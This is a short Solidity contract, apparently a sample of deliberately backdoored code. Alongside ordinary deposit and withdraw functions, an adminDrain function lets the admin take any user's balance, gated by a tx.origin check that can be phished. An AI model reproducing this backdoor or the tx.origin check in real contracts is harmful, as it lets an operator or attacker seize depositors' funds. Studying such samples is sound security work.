contract BackdoorAdmin {
    address public admin = msg.sender;
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        payable(msg.sender).transfer(balances[msg.sender]);
        balances[msg.sender] = 0;
    }

    function adminDrain(address user) external {
        if (tx.origin == admin) {
            payable(admin).transfer(balances[user]);
            balances[user] = 0;
        }
    }

    receive() external payable {}
}
